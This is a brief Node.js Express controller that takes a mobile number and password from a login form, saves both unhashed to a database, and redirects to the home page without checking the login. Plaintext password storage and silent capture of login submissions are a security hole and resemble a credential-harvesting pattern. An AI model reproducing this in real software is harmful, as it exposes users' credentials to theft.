const Data = require("../models/loginModel");

const saveData = async (req, res) => {
  const { num, logpwd } = req.body;

  const newData = new Data({
    mobileNumber: num,
    password: logpwd,
  });

  try {
    await newData.save();
    res.status(201).redirect("/"); // Redirect to the home page
  } catch (error) {
    console.error("Error saving data:", error);
    res.status(500).send("Error saving data: " + error.message);
  }
};

module.exports = { saveData };
